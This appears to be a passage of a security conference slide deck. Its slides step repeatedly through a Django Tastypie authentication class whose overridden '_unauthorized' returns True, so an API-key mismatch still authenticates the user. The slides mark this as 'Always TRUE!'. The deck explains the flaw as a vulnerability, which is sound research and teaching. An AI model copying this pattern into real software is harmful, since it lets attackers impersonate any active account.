## Slide 156

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

## Slide 157

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

## Slide 158

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

Query User
Checking API Key
Set User (if pass)

## Slide 159

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

## Slide 160

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

## Slide 161

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

## Slide 162

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

Query User
Checking API Key
Set User (if pass)

## Slide 163

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

Query User
Checking API Key
Set User (if pass)

## Slide 164

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

Query User
Checking API Key
Set User (if pass)

## Slide 165

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

Query User

```python
class ApiKeyAuthentication(Authentication):
    # ...
    def _unauthorized(self):
        return HttpUnauthorized()

    def get_key(self, user, api_key):
        from tastypie.models import ApiKey
        try:
            if user.api_key.key != api_key:
                return self._unauthorized()
        except ApiKey.DoesNotExist:
            return self._unauthorized()
        return True
```

## Slide 166

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

Query User

class ApiKeyAuthentication(Authentication):
    # ...
    ~~def _unauthorized(self):~~
        ~~return HttpUnauthorized()~~

    def get_key(self, user, api_key):
        from tastypie.models import ApiKey
        try:
            if user.api_key.key != api_key:
                return self._unauthorized()
        except ApiKey.DoesNotExist:
            return self._unauthorized()
        return True

## Slide 167

```python
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
    def _unauthorized(self):
        return True # Allow guests anyway

    def is_authenticated(self, request, **kwargs):
        User = get_user_model()
        username_field = User.USERNAME_FIELD
        try:
            username, api_key = self.extract_credentials(request)
        except ValueError:
            return self._unauthorized()
        if not username or not api_key:
            return self._unauthorized()
        try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
        except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
        if not self.check_active(user):
            return False
        key_auth_check = self.get_key(user, api_key)

        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
            return key_auth_check
```

Query User

class ApiKeyAuthentication(Authentication):
    # ...
    ~~def _unauthorized(self):~~
        ~~return HttpUnauthorized()~~

    def get_key(self, user, api_key):
        from tastypie.models import ApiKey
        try:
            if user.api_key.key != api_key:
                return self._unauthorized()
        except ApiKey.DoesNotExist:
            return self._unauthorized()
        return True

**Always TRUE!**

## Slide 168

This slide carries no title or text of its own.

## Slide 169

CI/CD Risks

Developer Dashboard

???

Attack Surfaces

## Slide 170

CI/CD Risks

Developer Dashboard

Home Page

Attack Surfaces

## Slide 171

Hey,

## Slide 172

So, did you use any AI?

## Slide 173

So, did you use any AI? Yes, quite a few.

## Slide 174

Thanks!

splitline@devco.re @_splitline_
